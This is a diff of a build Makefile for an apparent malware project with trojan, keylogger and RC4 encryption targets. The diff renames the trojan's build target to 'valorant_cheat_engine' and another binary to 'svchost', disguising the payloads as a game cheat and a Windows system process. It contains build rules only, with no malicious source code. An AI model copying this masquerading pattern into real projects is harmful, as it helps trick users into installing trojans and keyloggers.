@@ -142,17 +142,17 @@ win32update/fast:
 .PHONY : win32update/fast
 
 #=============================================================================
-# Target rules for targets named chrome_update
+# Target rules for targets named valorant_cheat_engine
 
 # Build rule for target.
-chrome_update: cmake_check_build_system
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\Makefile2 chrome_update
-.PHONY : chrome_update
+valorant_cheat_engine: cmake_check_build_system
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\Makefile2 valorant_cheat_engine
+.PHONY : valorant_cheat_engine
 
 # fast build rule for target.
-chrome_update/fast:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\chrome_update.dir\build.make CMakeFiles/chrome_update.dir/build
-.PHONY : chrome_update/fast
+valorant_cheat_engine/fast:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\valorant_cheat_engine.dir\build.make CMakeFiles/valorant_cheat_engine.dir/build
+.PHONY : valorant_cheat_engine/fast
 
 #=============================================================================
 # Target rules for targets named msvcmon
@@ -168,17 +168,17 @@ msvcmon/fast:
 .PHONY : msvcmon/fast
 
 #=============================================================================
-# Target rules for targets named msvcsvc
+# Target rules for targets named svchost
 
 # Build rule for target.
-msvcsvc: cmake_check_build_system
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\Makefile2 msvcsvc
-.PHONY : msvcsvc
+svchost: cmake_check_build_system
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\Makefile2 svchost
+.PHONY : svchost
 
 # fast build rule for target.
-msvcsvc/fast:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\msvcsvc.dir\build.make CMakeFiles/msvcsvc.dir/build
-.PHONY : msvcsvc/fast
+svchost/fast:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\svchost.dir\build.make CMakeFiles/svchost.dir/build
+.PHONY : svchost/fast
 
 b64tool.obj: b64tool.c.obj
 .PHONY : b64tool.obj
@@ -211,14 +211,6 @@ b64tool.obj: b64tool.rc.obj
 b64tool.rc.obj:
 	$(MAKE) $(MAKESILENT) -f CMakeFiles\b64tool.dir\build.make CMakeFiles/b64tool.dir/b64tool.rc.obj
 .PHONY : b64tool.rc.obj
-
-chrome.obj: chrome.rc.obj
-.PHONY : chrome.obj
-
-# target to build an object file
-chrome.rc.obj:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\chrome_update.dir\build.make CMakeFiles/chrome_update.dir/chrome.rc.obj
-.PHONY : chrome.rc.obj
 
 kylg_winapi.obj: kylg_winapi.c.obj
 .PHONY : kylg_winapi.obj
@@ -275,39 +267,38 @@ msvc.obj: msvc.rc.obj
 msvc.rc.obj:
 	$(MAKE) $(MAKESILENT) -f CMakeFiles\win32update.dir\build.make CMakeFiles/win32update.dir/msvc.rc.obj
 	$(MAKE) $(MAKESILENT) -f CMakeFiles\msvcmon.dir\build.make CMakeFiles/msvcmon.dir/msvc.rc.obj
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\msvcsvc.dir\build.make CMakeFiles/msvcsvc.dir/msvc.rc.obj
 .PHONY : msvc.rc.obj
 
-msvcsvc.obj: msvcsvc.c.obj
-.PHONY : msvcsvc.obj
+svchost.obj: svchost.c.obj
+.PHONY : svchost.obj
 
 # target to build an object file
-msvcsvc.c.obj:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\msvcsvc.dir\build.make CMakeFiles/msvcsvc.dir/msvcsvc.c.obj
-.PHONY : msvcsvc.c.obj
+svchost.c.obj:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\svchost.dir\build.make CMakeFiles/svchost.dir/svchost.c.obj
+.PHONY : svchost.c.obj
 
-msvcsvc.i: msvcsvc.c.i
-.PHONY : msvcsvc.i
+svchost.i: svchost.c.i
+.PHONY : svchost.i
 
 # target to preprocess a source file
-msvcsvc.c.i:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\msvcsvc.dir\build.make CMakeFiles/msvcsvc.dir/msvcsvc.c.i
-.PHONY : msvcsvc.c.i
+svchost.c.i:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\svchost.dir\build.make CMakeFiles/svchost.dir/svchost.c.i
+.PHONY : svchost.c.i
 
-msvcsvc.s: msvcsvc.c.s
-.PHONY : msvcsvc.s
+svchost.s: svchost.c.s
+.PHONY : svchost.s
 
 # target to generate assembly for a file
-msvcsvc.c.s:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\msvcsvc.dir\build.make CMakeFiles/msvcsvc.dir/msvcsvc.c.s
-.PHONY : msvcsvc.c.s
+svchost.c.s:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\svchost.dir\build.make CMakeFiles/svchost.dir/svchost.c.s
+.PHONY : svchost.c.s
 
 trojan.obj: trojan.c.obj
 .PHONY : trojan.obj
 
 # target to build an object file
 trojan.c.obj:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\chrome_update.dir\build.make CMakeFiles/chrome_update.dir/trojan.c.obj
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\valorant_cheat_engine.dir\build.make CMakeFiles/valorant_cheat_engine.dir/trojan.c.obj
 .PHONY : trojan.c.obj
 
 trojan.i: trojan.c.i
@@ -315,7 +306,7 @@ trojan.i: trojan.c.i
 
 # target to preprocess a source file
 trojan.c.i:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\chrome_update.dir\build.make CMakeFiles/chrome_update.dir/trojan.c.i
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\valorant_cheat_engine.dir\build.make CMakeFiles/valorant_cheat_engine.dir/trojan.c.i
 .PHONY : trojan.c.i
 
 trojan.s: trojan.c.s
@@ -323,8 +314,16 @@ trojan.s: trojan.c.s
 
 # target to generate assembly for a file
 trojan.c.s:
-	$(MAKE) $(MAKESILENT) -f CMakeFiles\chrome_update.dir\build.make CMakeFiles/chrome_update.dir/trojan.c.s
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\valorant_cheat_engine.dir\build.make CMakeFiles/valorant_cheat_engine.dir/trojan.c.s
 .PHONY : trojan.c.s
+
+trojan.obj: trojan.rc.obj
+.PHONY : trojan.obj
+
+# target to build an object file
+trojan.rc.obj:
+	$(MAKE) $(MAKESILENT) -f CMakeFiles\valorant_cheat_engine.dir\build.make CMakeFiles/valorant_cheat_engine.dir/trojan.rc.obj
+.PHONY : trojan.rc.obj
 
 # Help Target
 help:
@@ -335,15 +334,14 @@ help:
 	@echo ... edit_cache
 	@echo ... rebuild_cache
 	@echo ... b64tool
-	@echo ... chrome_update
 	@echo ... msvcmon
-	@echo ... msvcsvc
+	@echo ... svchost
+	@echo ... valorant_cheat_engine
 	@echo ... win32update
 	@echo ... b64tool.obj
 	@echo ... b64tool.i
 	@echo ... b64tool.s
 	@echo ... b64tool.obj
-	@echo ... chrome.obj
 	@echo ... kylg_winapi.obj
 	@echo ... kylg_winapi.i
 	@echo ... kylg_winapi.s
@@ -351,12 +349,13 @@ help:
 	@echo ... malwr_rc4.i
 	@echo ... malwr_rc4.s
 	@echo ... msvc.obj
-	@echo ... msvcsvc.obj
-	@echo ... msvcsvc.i
-	@echo ... msvcsvc.s
+	@echo ... svchost.obj
+	@echo ... svchost.i
+	@echo ... svchost.s
 	@echo ... trojan.obj
 	@echo ... trojan.i
 	@echo ... trojan.s
+	@echo ... trojan.obj
 .PHONY : help
 
 
